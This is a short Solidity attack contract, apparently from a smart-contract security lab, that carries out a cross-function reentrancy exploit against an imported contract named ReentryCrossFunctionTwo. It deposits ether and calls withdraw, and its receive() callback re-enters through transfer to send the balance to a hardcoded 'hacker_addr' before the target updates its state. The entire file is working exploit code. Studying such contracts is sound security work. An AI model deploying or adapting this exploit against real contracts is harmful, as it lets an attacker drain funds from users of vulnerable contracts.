// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./ReentryCrossFunctionTwo.sol";

contract AttackCrossFunctionTwo {
    ReentryCrossFunctionTwo public target;
    address public constant hacker_addr = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;
    uint256 amount;

    constructor(address _target) {
        target = ReentryCrossFunctionTwo(_target);
    }

    function attack() public payable {
        amount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        // 跨函数重入
        target.transfer(hacker_addr, amount);
    }
}
